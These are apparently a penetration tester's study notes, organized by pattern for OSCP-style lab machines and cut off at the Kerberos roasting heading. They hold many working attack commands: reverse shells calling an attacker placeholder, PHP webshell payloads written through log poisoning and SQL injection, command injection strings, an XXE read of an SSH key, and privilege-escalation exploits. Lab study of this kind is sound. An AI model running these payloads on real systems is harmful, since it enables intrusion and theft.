+++
title = 'Pentesting Pattern Library'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['oscp', 'methodology', 'patterns']
+++

> A problem-first index of the recurring techniques that decide the boxes on the OSCP-like lab list. Each pattern is deliberately small: **when** to reach for it, the **prerequisite check** that must pass, the commands worth memorising, and the machines where it was the difference between stuck and rooted. It sits between three neighbours: the [command checklist](/notes/oscp-labs/commands/) you run at the start of every box, the [Linux](/notes/oscp-labs/linux/), [Windows](/notes/oscp-labs/windows/) and [AD](/notes/oscp-labs/ad/) machine pages that walk one box end-to-end, and the "Cross-machine patterns" summary at the end of each machine page. This page is the layer that transfers: a technique is worth learning when you can name two machines it appears on and the condition that makes it fire. Nothing here is a walkthrough, and every command still needs its placeholders replaced.

## Pattern index

| Pattern                                                    | Phase       | Machines (examples)                          | Note page                                                                                |
| ---------------------------------------------------------- | ----------- | -------------------------------------------- | ---------------------------------------------------------------------------------------- |
| Full-port and UDP reachability                             | Recon       | Solidstate, Sunday, Chatterbox, UnderPass    | [Info gathering](/notes/web-applications/information-gathering/)                                               |
| Vhost discovery when the IP root is a decoy                | Recon       | Keeper, Editor, BoardLight, Love             | [Fuzzing](/notes/web-applications/fuzzing/)                                                |
| Exposed repositories, backups and source archives          | Recon       | Pilgrimage, UpDown, Linkvortex, Dog          | [Info gathering](/notes/web-applications/information-gathering/)                                               |
| Version fingerprint to CVE                                 | Recon       | Pilgrimage, Broker, Arctic, Devvortex        | [Info gathering](/notes/web-applications/information-gathering/)                                               |
| Default, guessable and reused credentials                  | Credentials | Nibbles, Solidstate, Sunday, UnderPass       | [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/)                |
| Credentials mined from non-web services                    | Credentials | Pandora, Solidstate, Enigma, Netmon          | [SNMP](/notes/protocols-and-services/snmp/)                                                |
| Hash identification and cracking modes                     | Credentials | Sunday, Codify, Builder, Active              | [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/)                |
| Spraying across authentication backends                    | Credentials | EscapeTwo, Signed, Heist, UnderPass          | [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/)                |
| Land code in an executable location                        | Web         | Popcorn, Magic, Bounty, Tabby                | [File uploads](/notes/web-applications/web-attacks/file-uploads/)                          |
| LFI and RFI to code execution                              | Web         | Poison, Nineveh, Sniper, UpDown              | [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/)                       |
| SQL injection: bypass, dump, write                         | Web         | Jarvis, Magic, Giddy, Cctv                   | [SQL injection](/notes/web-applications/web-attacks/sql-injection/)                        |
| Command injection in web parameters                        | Web         | Cozyhosting, Precious, OpenAdmin, Mentor     | [OS command injection](/notes/web-applications/web-attacks/os-command-injection/)          |
| Application-layer code sinks                               | Web         | Busqueda, Gobox, Editor, Codify              | [Web attacks](/notes/web-applications/web-attacks/)                                 |
| SSRF and XXE: server-side request primitives               | Web         | Editorial, Love, Return, Markup              | [SSRF](/notes/web-applications/web-attacks/ssrf/)                                          |
| sudo: GTFOBins and script logic                            | Linux       | Sunday, Cozyhosting, OpenAdmin, Swagshop     | [Jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/)         |
| Root-run jobs you can write or influence                   | Linux       | Nibbles, Solidstate, Bashed, Networked       | [Jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/)         |
| SUID, capabilities and PATH hijacking                      | Linux       | Magic, Pandora, Irked, Cctv                  | [Capabilities](/notes/linux-privilege-escalation/capabilities-abuse/)                      |
| Privileged groups and container escape                     | Linux       | Tabby, Busqueda, Silentium, Mentor           | [Privileged groups](/notes/linux-privilege-escalation/privileged-groups/)                  |
| Kernel, PAM and SUID CVE fallbacks                         | Linux       | Popcorn, Help, BoardLight                    | [Miscellaneous](/notes/linux-privilege-escalation/miscellaneous-techniques/)               |
| SeImpersonate and the potato family                        | Windows     | Bounty, Mailing, Querier, Signed             | [Excessive rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/)       |
| A privileged process runs an artifact you control          | Windows     | Markup, Giddy, Love, Chatterbox              | [File system ACLs](/notes/windows-privilege-escalation/file-system-acls/)                  |
| Legacy kernel and third-party service exploits             | Windows     | Arctic, Buff, Bounty                         | [Attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/)          |
| Unauthenticated user enumeration                           | AD          | Forest, Sauna, Cicada, Monteverde            | [Initial access](/notes/active-directory/initial-access/)                                  |
| Kerberos roasting                                          | AD          | Forest, Sauna, Active, Administrator         | [Internal enumeration](/notes/active-directory/internal-enumeration-and-lateral-movement/) |
| ACL and GPO abuse to DCSync                                | AD          | Forest, Blackfield, Certified, TheFrizz      | [ACL abuse](/notes/active-directory/internal-enumeration-and-lateral-movement/)            |
| ADCS ESC chains                                            | AD          | Escape, EscapeTwo, Certified                 | [ADCS attacks](/notes/active-directory/adcs-attacks/)                                      |
| Backup and Server Operators                                | AD          | Return, Blackfield, Cicada                   | [Built-in groups](/notes/windows-privilege-escalation/built-in-groups-abuse/)              |
| Coerced authentication to Net-NTLMv2                       | AD          | Querier, Giddy, Escape, Return               | [NTLM relay](/notes/active-directory/ntlm-relay/)                                          |
| MSSQL as an AD pivot                                       | AD          | Escape, EscapeTwo, Querier, Signed           | [MSSQL](/notes/protocols-and-services/mssql/)                                              |
| Localhost-only services and tunnels                        | Pivot       | Poison, Editor, Enigma, Buff                 | [Pivoting](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/)      |
| Payload staging and delivery                               | Pivot       | Buff, Sniper, Giddy, Flight                  | [File transfers](/notes/utilities-scripts-and-payloads/file-transfers/)                    |
| Loot: hidden data, dumps and stored credentials            | Pivot       | Jeeves, Access, TheFrizz, Timelapse          | [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/)            |
| Recognise the decoy, the fake version and the revert timer | Pitfalls    | Tartarsauce, Bashed, Forest, Broker          | [Attack vectors](/notes/linux-privilege-escalation/enumerating-attack-vectors/)            |
| Verify execution and re-encode                             | Pitfalls    | Silentium, Editorial, Monitored, Cozyhosting | [Shells and payloads](/notes/utilities-scripts-and-payloads/shells-and-payloads/)          |

## Recon & enumeration

### Full-port and UDP reachability

**When:** the default scan looks empty or shows only a decoy web page, and the box is probably a service you have not touched yet.

**Prerequisites:** permission for full TCP and UDP scans, plus the time budget — a `-p-` run is cheaper than an hour on the wrong service.

**Commands:**

```bash
nmap -sT -p- --min-rate 5000 --max-retries 1 <IP>
sudo nmap -sU -F <IP>
showmount -e <IP>
nc -nv <IP> 6697          # banner can leak a username
```

**Seen on:** [Solidstate](/notes/oscp-labs/linux/) (Linux), [Sunday](/notes/oscp-labs/linux/) (Linux), [Chatterbox](/notes/oscp-labs/windows/) (Windows), [UnderPass](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Information gathering](/notes/web-applications/information-gathering/) · **Pitfall:** trusting the top-1000 TCP scan — 4555, 22022, 61616 and UDP/161 were the whole foothold.

### Vhost discovery when the IP root is a decoy

**When:** the IP answers with a default page, a redirect or a static site, while the domain name suggests an application that is not there.

**Prerequisites:** a domain name to fuzz (from the certificate, page source, mail headers or the box name); wildcard responses require calibration, not status filtering.

**Commands:**

```bash
ffuf -u http://<IP> -H "Host: FUZZ.<DOMAIN>" -w subdomains-top1million-20000.txt -ac
openssl s_client -connect <IP>:443        # SANs often list the vhosts
curl -H 'Special-Dev: only4dev' http://dev.<DOMAIN>/   # .htaccess SetEnvIf gate
```

**Seen on:** [Keeper](/notes/oscp-labs/linux/) (Linux), [Editor](/notes/oscp-labs/linux/) (Linux), [BoardLight](/notes/oscp-labs/linux/) (Linux), [Love](/notes/oscp-labs/windows/) (Windows)

**Notes:** [Fuzzing](/notes/web-applications/fuzzing/) · **Pitfall:** filtering on status codes only — wildcard 301s and empty 200s hide the real vhost; use `-ac` (and check 403-vs-404 for directories).

### Exposed repositories, backups and source archives

**When:** you need the application's source, secrets or version and the app gives you nothing; a `.git`, a backup tarball or an old config is usually one request away.

**Prerequisites:** a vhost or directory you can read; `.git` may sit at the vhost root rather than under the app path.

**Commands:**

```bash
nmap -p80 -sCV <DOMAIN>                 # http-git / http-generator scripts
git-dumper http://<DOMAIN>/git ./src
git -C src status && git -C src diff --cached
tar xvf backup.tar
```

**Seen on:** [Pilgrimage](/notes/oscp-labs/linux/) (Linux), [UpDown](/notes/oscp-labs/linux/) (Linux), [Linkvortex](/notes/oscp-labs/linux/) (Linux), [Dog](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Information gathering](/notes/web-applications/information-gathering/) · **Pitfall:** expecting the wordlist to find it — `.git` at a vhost root, `/backup/*.tar` and a config backup are routinely missed.

### Version fingerprint to CVE

**When:** an identified product has a public exploit and the only remaining question is the exact version.

**Prerequisites:** a version string from the artifact itself (PDF metadata, service banner, manifest, changelog), not from the marketing page.

**Commands:**

```bash
exiftool out.pdf | grep Creator          # pdfkit v0.8.6 from the artifact
nc <IP> 61616                            # OpenWire banner: ProviderVersion
curl -s http://<IP>/administrator/manifests/files/joomla.xml
searchsploit <product>
```

**Seen on:** [Pilgrimage](/notes/oscp-labs/linux/) (Linux), [Broker](/notes/oscp-labs/linux/) (Linux), [Arctic](/notes/oscp-labs/windows/) (Windows), [Devvortex](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Information gathering](/notes/web-applications/information-gathering/) · **Pitfall:** believing the advertised version — a plugin changelog can deliberately lie (Tartarsauce), and the vulnerable component may be a bundled binary.

## Credentials & reuse

### Default, guessable and reused credentials

**When:** any login panel, service or hash appears; the cheapest win is a default, the box name, or a password you already hold.

**Prerequisites:** a username. Try the product default first, then the box/domain name, then every pair you have collected.

**Commands:**

```bash
nc <IP> 4555                  # Apache James admin — default root:root
# Request Tracker root:password · Tomcat tomcat:s3cret · daloRADIUS administrator:radius
netexec smb <IP> -u <USER> -p '<PASS>' --continue-on-success
sshpass -p '<PASS>' ssh <USER>@<IP> -t bash
su - <USER>
```

**Seen on:** [Nibbles](/notes/oscp-labs/linux/) (Linux), [Solidstate](/notes/oscp-labs/linux/) (Linux), [Sunday](/notes/oscp-labs/linux/) (Linux), [UnderPass](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · **Pitfall:** hunting a new bug before spraying every recovered or guessed pair at every user and every service.

### Credentials mined from non-web services

**When:** a share, mailbox, SNMP agent or file service is reachable but you have only looked at HTTP.

**Prerequisites:** anonymous/guest access or a low-privilege account; for SNMP, a valid community string; for mail, a working login.

**Commands:**

```bash
snmpbulkwalk -Cr1000 -c public -v2c <IP> > snmp.txt
grep hrSWRunParameters snmp.txt
showmount -e <IP> && sudo mount -t nfs <IP>:/srv/nfs/onboarding /mnt/nfs
telnet <IP> 110        # POP3: USER / PASS / LIST / RETR 1
wget -r ftp://anonymous:@<IP>
```

**Seen on:** [Pandora](/notes/oscp-labs/linux/) (Linux), [Solidstate](/notes/oscp-labs/linux/) (Linux), [Enigma](/notes/oscp-labs/linux/) (Linux), [Netmon](/notes/oscp-labs/windows/) (Windows)

**Notes:** [SNMP](/notes/protocols-and-services/snmp/) · [POP3](/notes/protocols-and-services/pop3/) · [NFS](/notes/protocols-and-services/nfs/) · **Pitfall:** assuming `public` is the only community string — `internal` was the live one (Mentor).

### Hash identification and cracking modes

**When:** you have a hash and need to know whether it is worth cracking and which mode to force.

**Prerequisites:** recognise the format first — `$5$`/`$2a$`/NetNTLMv2/Kerberos tickets all have distinct modes; keep a wordlist and a time cap.

**Commands:**

```bash
hashcat -m 7400 hashes rockyou.txt          # $5$ sha256crypt
hashcat -m 3200 hash --user rockyou.txt     # bcrypt $2a$/$2y$
hashcat -m 5600 netntlmv2 rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt
zip2john backup.zip > h && john h
```

**Seen on:** [Sunday](/notes/oscp-labs/linux/) (Linux), [Codify](/notes/oscp-labs/linux/) (Linux), [Builder](/notes/oscp-labs/linux/) (Linux), [Active](/notes/oscp-labs/ad/) (AD)

**Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · **Pitfall:** letting hashcat autodetect bcrypt — four modes are offered and a `#jbcrypt:` prefix is parsed as a username; force `-m 3200 --user`.

### Spraying across authentication backends

**When:** a password list or a single found password needs to be tested across many accounts and several services.

**Prerequisites:** lockout policy understood (one attempt per account per window on a real engagement); know whether the service uses domain, local or SQL authentication.

**Commands:**

```bash
netexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
netexec mssql <IP> -u users.txt -p passwords.txt --continue-on-success --local-auth
netexec ssh <IP> -u users.txt -p passwords.txt --continue-on-success
rpcclient -U '<USER>%<PASS>' <IP> -c 'lookupsids S-1-5-21-...-1012'
```

**Seen on:** [EscapeTwo](/notes/oscp-labs/ad/) (AD), [Signed](/notes/oscp-labs/ad/) (AD), [Heist](/notes/oscp-labs/windows/) (Windows), [UnderPass](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Password attacks](/notes/utilities-scripts-and-payloads/password-attacks/) · **Pitfall:** stopping at the first success and forgetting `--local-auth` — the same list must be tested against both SQL and domain auth, and username case matters.

## Web to shell

### Land code in an executable location

**When:** you have file write on the target (upload, share, deploy) and need the server to execute it.

**Prerequisites:** a path the web server executes **and** a filter you can satisfy — extension, `Content-Type`, magic bytes, handler mapping, or a manager role.

**Commands:**

```bash
# Content-Type-only filter: keep image/png, rename to .php (Popcorn)
curl 'http://<IP>/torrent/upload/<sha1>.php?cmd=id'
# magic bytes + double extension; .htaccess regex lacks a $ anchor (Magic)
cp img.png avatar.php.png
# handler mapping: upload web.config, then request it (Bounty)
curl http://<IP>/UploadedFiles/web.config
# manager deploy with a script-role account (Tabby)
curl -u tomcat:'<PASS>' -T shell.war 'http://<IP>:8080/manager/text/deploy?path=/x&update=true'
# WAR payload, random JSP name (Jerry)
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f war > r.war && jar tf r.war
```

**Seen on:** [Popcorn](/notes/oscp-labs/linux/) (Linux), [Magic](/notes/oscp-labs/linux/) (Linux), [Bounty](/notes/oscp-labs/windows/) (Windows), [Tabby](/notes/oscp-labs/linux/) (Linux)

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Tomcat](/notes/web-applications/web-technologies/tomcat/) · [IIS](/notes/web-applications/web-technologies/microsoft-iis/) · **Pitfall:** assuming the upload is the shell — if the extension does not execute, the win is a config/handler file or a different writable directory.

### LFI and RFI to code execution

**When:** a parameter includes or reads a path, and the file it reads can be influenced or poisoned.

**Prerequisites:** an include (not just a read) that accepts a path, or a readable log/session file whose contents you control; check `allow_url_include` before chasing RFI.

**Commands:**

```bash
# log poisoning via User-Agent, then include the log (Poison)
curl -A '<?php system($_GET["c"]); ?>' http://<IP>/
curl 'http://<IP>/browse.php?file=/var/log/httpd-access.log&c=id'
# satisfy a substring filter with a fake directory (Nineveh)
curl 'http://<IP>/index.php?notes=/ninevehNotes/../var/tmp/x.php&cmd=id'
# absolute Windows path only (Sniper)
curl -s -G 'http://<IP>/blog/' --data-urlencode 'lang=\windows\win.ini'
# phar:// executes an archive with any extension (UpDown)
curl 'http://<IP>/?page=phar://uploads/<md5>/rev.0xdf/rev'
```

**Seen on:** [Poison](/notes/oscp-labs/linux/) (Linux), [Nineveh](/notes/oscp-labs/linux/) (Linux), [Sniper](/notes/oscp-labs/windows/) (Windows), [UpDown](/notes/oscp-labs/linux/) (Linux)

**Notes:** [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/) · [RFI](/notes/web-applications/web-attacks/remote-file-inclusion-rfi/) · **Pitfall:** chasing RFI after reading `allow_url_include=Off` — read `phpinfo.php` first, then poison a file the app already includes.

### SQL injection: bypass, dump, write

**When:** a login, search or `id` parameter behaves differently on quote/boolean input.

**Prerequisites:** for file writes, `FILE` privilege and a web-writable directory; for stacked queries, MSSQL; for writing via a job table, a scheduler that executes rows.

**Commands:**

```bash
# login bypass (Magic); PHP type juggling variant: password[]= (Nineveh)
' or 1=1-- -
# UNION into a file, File_priv=Y required (Jarvis)
cod=999 UNION ALL SELECT null,'<?php system($_REQUEST["cmd"]); ?>',null,null,null,null,null INTO OUTFILE '/var/www/html/shell.php';-- -
# stacked query as a coercion primitive (Giddy)
8; EXEC master..xp_dirtree "\\<ATTACKER>\test"; --
# boolean rewrite when time-based is too slow (Cctv)
sqlmap -r removetag.request -p tid --batch --prefix="1 UNION SELECT 1,2,3,4 WHERE " --code 200 --technique=B
```

**Seen on:** [Jarvis](/notes/oscp-labs/linux/) (Linux), [Magic](/notes/oscp-labs/linux/) (Linux), [Giddy](/notes/oscp-labs/windows/) (Windows), [Cctv](/notes/oscp-labs/linux/) (Linux)

**Notes:** [SQL injection](/notes/web-applications/web-attacks/sql-injection/) · [MSSQL](/notes/protocols-and-services/mssql/) · **Pitfall:** running sqlmap at full speed into a rate-based WAF — throttle it (`--delay`, `--random-agent`) or work manually.

### Command injection in web parameters

**When:** a feature shells out — ping, backup, PDF render, image convert, network settings.

**Prerequisites:** an injectable field (often not the obvious one) and a filter you can work around: spaces, separators, blacklist gaps.

**Commands:**

```bash
# filtered command field, spaces via ${IFS}, comment terminator (Cozyhosting)
username=x;ping${IFS}-c${IFS}1${IFS}<IP>;#
# backticks in a URL parameter; leading encoded space (Precious)
url=http://<ATTACKER>/?name=%20`id`
# xajax body, trailing slash on /ona/ matters (OpenAdmin)
curl -s -d "xajax=window_submit&xajaxr=1&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" http://<IP>/ona/
# JSON path embedded in a tar command (Mentor)
{"path":"/tmp;nc <ATTACKER> <LPORT> -e sh;"}
```

**Seen on:** [Cozyhosting](/notes/oscp-labs/linux/) (Linux), [Precious](/notes/oscp-labs/linux/) (Linux), [OpenAdmin](/notes/oscp-labs/linux/) (Linux), [Mentor](/notes/oscp-labs/linux/) (Linux)

**Notes:** [OS command injection](/notes/web-applications/web-attacks/os-command-injection/) · **Pitfall:** injecting into the field that is filtered — the other parameter (username vs host) is usually the injectable one.

### Application-layer code sinks

**When:** user input reaches a template engine, an `eval`, or a deserializer, and classic command injection is unavailable.

**Prerequisites:** control of a string that is interpreted as code — a template expression, a query string, a sandbox `code` variable, or a serialized object.

**Commands:**

```bash
# Searchor eval() — payload is the query string (Busqueda)
' + __import__('os').popen('id').read() + '
# Go template SSTI in a login form (Gobox)
{{html "0xdf"}}
{{ . }}
# Groovy via XWiki SolrSearch (Editor) — URL-encode all characters
curl -s -G 'http://wiki.<DOMAIN>/xwiki/bin/view/Main/SolrSearch' --data-urlencode 'media=rss' --data-urlencode 'text=}}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}'
```

**Seen on:** [Busqueda](/notes/oscp-labs/linux/) (Linux), [Gobox](/notes/oscp-labs/ad/) (Linux), [Editor](/notes/oscp-labs/linux/) (Linux), [Codify](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Web attacks](/notes/web-applications/web-attacks/) · **Pitfall:** copying a whole POC — vm2 harnesses carry their own loader; submit only the `code` variable (Codify).

### SSRF and XXE: server-side request primitives

**When:** the app fetches a URL you supply, lets you set a server/host it will connect to, or parses XML you control — and the useful target is an internal service or a local file, not the public site.

**Prerequisites:** outbound connectivity from the app host (SSRF), or a parser that resolves external entities and echoes the value back (XXE); the result must return in the response or reach your listener.

**Commands:**

```bash
# multipart part required; response is a path to GET (Editorial)
curl -s -X POST http://<IP>/upload-cover -F bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors -F bookfile=@/etc/hostname
# admin panel that performs an outbound LDAP bind (Return)
curl -d 'ip=<ATTACKER>' http://<IP>/settings.php
nc -lvnp 389
# entity in an echoed field, text/xml (Markup)
curl -s -X POST http://<IP>/process.php -H 'Content-Type: text/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY t SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">]><order><quantity>3</quantity><item>&t;</item><address>x</address></order>'
```

**Seen on:** [Editorial](/notes/oscp-labs/linux/) (Linux), [Love](/notes/oscp-labs/windows/) (Windows), [Return](/notes/oscp-labs/ad/) (AD), [Markup](/notes/oscp-labs/windows/) (Windows)

**Notes:** [SSRF](/notes/web-applications/web-attacks/ssrf/) · [XXE](/notes/web-applications/web-attacks/xml-external-entities-xxe/) · **Pitfall:** assuming SSRF must reach cloud metadata, or sending the entity to a port/vhost that does not parse XML — internal APIs and outbound auth are the useful targets; on UpDown SSRF was a dead end.

## Linux privilege escalation

### sudo: GTFOBins and script logic

**When:** `sudo -l` returns anything you did not expect, including a script, a pager, an interpreter or a network client.

**Prerequisites:** the rule is usable by your user; for scripts, you can reach or influence what the script executes (a wildcard, a relative path, an environment variable).

**Commands:**

```bash
sudo -l
sudo wget --input-file /root/root.txt                  # leak via error message (Sunday)
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x            # runs before connecting (Cozyhosting)
sudo /bin/nano /opt/priv                               # ^R ^X then: reset; sh 1>&0 2>&0 (OpenAdmin)
sudo /usr/bin/vi /var/www/html/x -c ':!/bin/sh'        # wildcard is a prefix check (Swagshop)
```

**Seen on:** [Sunday](/notes/oscp-labs/linux/) (Linux), [Cozyhosting](/notes/oscp-labs/linux/) (Linux), [OpenAdmin](/notes/oscp-labs/linux/) (Linux), [Swagshop](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · [Miscellaneous](/notes/linux-privilege-escalation/miscellaneous-techniques/) · **Pitfall:** reading only the binary name — an unquoted comparison accepting `*` (Codify) or a `./script.sh` resolved from your CWD (Busqueda) is the actual bug.

### Root-run jobs you can write or influence

**When:** you cannot use `sudo`, but something runs as root on a schedule or on a file event.

**Prerequisites:** write access to the script, its directory, a file it sources, or a filename it consumes; otherwise the ability to observe the job with pspy.

**Commands:**

```bash
./pspy64 -pf -i 1000
# world-writable script run by root: append, do not replace (Nibbles)
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER> <LPORT> >/tmp/f' >> monitor.sh
# filename injection into exec("rm -f $path$value") (Networked)
touch '/var/www/html/uploads/a; echo <BASE64> | base64 -d | sh; b'
# incron: root script sources a writable config, then touch the trigger (Connected)
echo '<PAYLOAD> &' >> /etc/dahdi/init.conf && echo restart > /var/spool/asterisk/sysadmin/dahdi_restart
```

**Seen on:** [Nibbles](/notes/oscp-labs/linux/) (Linux), [Solidstate](/notes/oscp-labs/linux/) (Linux), [Bashed](/notes/oscp-labs/linux/) (Linux), [Networked](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Jobs and services](/notes/linux-privilege-escalation/programs-jobs-and-services/) · **Pitfall:** overwriting a shared or self-overwriting script — append and re-check, and test your payload in the shell the job actually uses (`sh`, not bash).

### SUID, capabilities and PATH hijacking

**When:** the binary list turns up a custom SUID program or a capability that a normal user should not hold.

**Prerequisites:** a SUID/`cap_*` binary that calls a helper by relative name, or executes a missing file from a directory you can write.

**Commands:**

```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
ltrace ./sysinfo | grep popen                        # shows the unresolved helper (Magic)
echo -e '#!/bin/bash\nbash' > /dev/shm/fdisk; chmod +x /dev/shm/fdisk
export PATH=/dev/shm:$PATH && sysinfo
printf 'cat /root/root.txt\n' > /tmp/listusers && /usr/bin/viewuser   # missing file run as root (Irked)
```

**Seen on:** [Magic](/notes/oscp-labs/linux/) (Linux), [Pandora](/notes/oscp-labs/linux/) (Linux), [Irked](/notes/oscp-labs/linux/) (Linux), [Cctv](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Capabilities abuse](/notes/linux-privilege-escalation/capabilities-abuse/) · [Environment variables](/notes/linux-privilege-escalation/environment-variables-abuse/) · **Pitfall:** stopping at the SUID list — trace the binary to see which helper it calls and whether that helper comes from `PATH`.

### Privileged groups and container escape

**When:** `id` shows a group that grants host access (`lxd`, `docker`), or you already have a shell inside a container.

**Prerequisites:** group membership or code execution in the container; for LXD, the ability to import or already have an image.

**Commands:**

```bash
id
ls -la /.dockerenv 2>/dev/null; env      # container secrets: DB/SMTP passwords (Silentium)
sudo /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .   # Busqueda
lxc image import alpine.tar.gz --alias alpine           # Tabby, lxd group (verify flags)
lxc init alpine p -c security.privileged=true
lxc config device add p host-root disk source=/ path=/mnt/root recursive=true
```

**Seen on:** [Tabby](/notes/oscp-labs/linux/) (Linux), [Busqueda](/notes/oscp-labs/linux/) (Linux), [Silentium](/notes/oscp-labs/linux/) (Linux), [Mentor](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Privileged groups](/notes/linux-privilege-escalation/privileged-groups/) · **Pitfall:** staging a glibc tool (chisel) into an Alpine container — use what the image already has, such as `python` and `psycopg2`.

### Kernel, PAM and SUID CVE fallbacks

**When:** the box is visibly old and the ordinary `sudo`/SUID/job paths are clean.

**Prerequisites:** a matching kernel or package version; for PAM MOTD, a real login that creates `~/.cache`, not just a webshell.

**Commands:**

```bash
uname -a; cat /etc/os-release
gcc -pthread dirty.c -o dirty -lcrypt && ./dirty                   # DirtyCow (Popcorn)
rm -rf ~/.cache; ln -s /etc/passwd ~/.cache; ssh localhost true    # PAM MOTD (Popcorn)
gcc -o a 44298.c && ./a                                            # kernel 4.4.0-116 (Help)
```

**Seen on:** [Popcorn](/notes/oscp-labs/linux/) (Linux), [Help](/notes/oscp-labs/linux/) (Linux), [BoardLight](/notes/oscp-labs/linux/) (Linux)

**Notes:** [Miscellaneous](/notes/linux-privilege-escalation/miscellaneous-techniques/) · **Pitfall:** running an exploit that spawns a local root shell from a non-interactive webshell — choose one that calls back to you.

## Windows privilege escalation

### SeImpersonate and the potato family

**When:** `whoami /priv` shows `SeImpersonatePrivilege` (or `SeAssignPrimaryToken`) on a service account, usually a web-app pool.

**Prerequisites:** the privilege is present and **enabled**; pick the exploit by OS build, because the potato family is version-gated.

**Commands:**

```bash
whoami /priv
GodPotato.exe -cmd "nc64.exe -e cmd.exe <ATTACKER> <LPORT>"   # modern Windows (Mailing)
lp.exe * rev.bat                                              # Server 2008 R2 (Bounty)
```

**Seen on:** [Bounty](/notes/oscp-labs/windows/) (Windows), [Mailing](/notes/oscp-labs/windows/) (Windows), [Querier](/notes/oscp-labs/windows/) (Windows), [Signed](/notes/oscp-labs/ad/) (AD)

**Notes:** [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · **Pitfall:** running JuicyPotato on Server 2019+ — it is dead there; use GodPotato/PrintSpoofer, and check for a filtered token first.

### A privileged process runs an artifact you control

**When:** a service, scheduled job, installer or ACL lets your user write a file that a higher-privileged process executes.

**Prerequisites:** write access to the binary/script/installer path, **or** both `AlwaysInstallElevated` keys set to 1, **or** an inherited ACE on a privileged file.

**Commands:**

```bash
icacls C:\Log-Management\job.bat                    # BUILTIN\Users:(F), reset each run (Markup)
cmd /c echo C:\Users\Daniel\nc64.exe -e cmd.exe <ATTACKER> <LPORT> > C:\Log-Management\job.bat
sc config <SERVICE> binpath= "cmd.exe /c C:\path\nc64.exe -e cmd <ATTACKER> <LPORT>"
Stop-Service -Name Unifivideoservice -Force          # missing taskkill.exe on stop (Giddy)
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   # must be 1 in HKCU and HKLM (Love)
msiexec /quiet /qn /i rev.msi
icacls root.txt /grant <USER>:F                      # inherited Full Control on the parent (Chatterbox)
```

**Seen on:** [Markup](/notes/oscp-labs/windows/) (Windows), [Giddy](/notes/oscp-labs/windows/) (Windows), [Love](/notes/oscp-labs/windows/) (Windows), [Chatterbox](/notes/oscp-labs/windows/) (Windows)

**Notes:** [File system ACLs](/notes/windows-privilege-escalation/file-system-acls/) · [Unquoted service paths](/notes/windows-privilege-escalation/unquoted-service-paths/) · **Pitfall:** assuming the writable file is the exploit — Markup's `job.bat` is overwritten each run, so your line vanishes and looks like failure.

### Legacy kernel and third-party service exploits

**When:** the host is unpatched, or a userland service listens on localhost and its version is old.

**Prerequisites:** an exact OS build or product version; the exploit must take a callback (`LHOST`/`LPORT`), not spawn a local shell.

**Commands:**

```bash
systeminfo | findstr /C:"Hotfix(s)"
windows-exploit-suggester.py --update
Chimichurri.exe <ATTACKER> <LPORT>            # MS10-059 (Arctic)
netstat -ano | findstr :0                    # localhost-only service (Buff)
tasklist /v | findstr <PID>
```

**Seen on:** [Arctic](/notes/oscp-labs/windows/) (Windows), [Buff](/notes/oscp-labs/windows/) (Windows), [Bounty](/notes/oscp-labs/windows/) (Windows)

**Notes:** [Attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · **Pitfall:** launching a local-only exploit from a remote shell — a SYSTEM `cmd.exe` you cannot see is not a shell.

## Active Directory

### Unauthenticated user enumeration

**When:** you have no credentials but SMB, RPC or Kerberos is reachable on a domain controller.

**Prerequisites:** null RPC, guest SMB, or Kerberos pre-auth probing is allowed; know that a lockout policy turns spraying into a footgun.

**Commands:**

```bash
rpcclient -U "" -N <IP>          # then: enumdomusers / querydispinfo
kerbrute userenum -d <DOMAIN> --dc <IP> users.txt
netexec smb <IP> -u guest -p '' --rid-brute | grep SidTypeUser
netexec ldap <IP> -u <USER> -p '<PASS>' --users
```

**Seen on:** [Forest](/notes/oscp-labs/ad/) (AD), [Sauna](/notes/oscp-labs/ad/) (AD), [Cicada](/notes/oscp-labs/ad/) (AD), [Monteverde](/notes/oscp-labs/ad/) (AD)

**Notes:** [Initial access](/notes/active-directory/initial-access/) · **Pitfall:** treating kerbrute's four case variants of one user as four users — lowercase and `sort -u` before spraying, or you inflate the list and any lockout counter.

### Kerberos roasting

